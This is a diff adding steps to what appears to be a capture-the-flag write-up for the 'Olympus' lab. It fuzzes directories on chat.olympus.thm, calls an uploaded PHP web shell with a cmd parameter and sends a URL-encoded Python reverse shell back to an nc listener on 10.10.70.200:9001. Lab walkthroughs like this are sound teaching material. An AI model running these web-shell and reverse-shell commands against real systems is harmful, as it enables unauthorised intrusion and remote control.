@@ -168,6 +168,8 @@ Table: chats
 +------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
 ```
 
+Last step is to know where the file is located, quick directory fuzzing on chat.olympus.thm and we have the directory uploads.
+
 ```bash
 root@ip-10-10-70-200:~# ffuf -u http://chat.olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 
@@ -201,11 +203,24 @@ server-status           [Status: 403, Size: 281, Words: 20, Lines: 10]
 static                  [Status: 301, Size: 321, Words: 20, Lines: 10]
 uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10]
 ```
+To test our php file 
+```bash
+http://chat.olympus.thm/uploads/68f62a3e00cf75c6a0ddc9b949f36850.php?cmd=id
+```
+
 ![image](https://user-images.githubusercontent.com/90036439/223988276-0a0779ab-2cfd-4b1e-a09f-c56f732dd54c.png)
+
+Now set up a listener 
+```bash
+nc -lvnp 9001
+```
+And send a revershell via the php file that we uploaded on the server. Don't forget to URL encode it.
 
 ```
 curl http://chat.olympus.thm/uploads/32c800549703817361ff290d8b2bfc9a.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.70.200%22%2C9001%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
 ```
+
+Aaaand we are on the server ! Now stabilize your shell before we start to move laterally.
 
 ```bash
 root@ip-10-10-70-200:~# nc -lvnp 9001
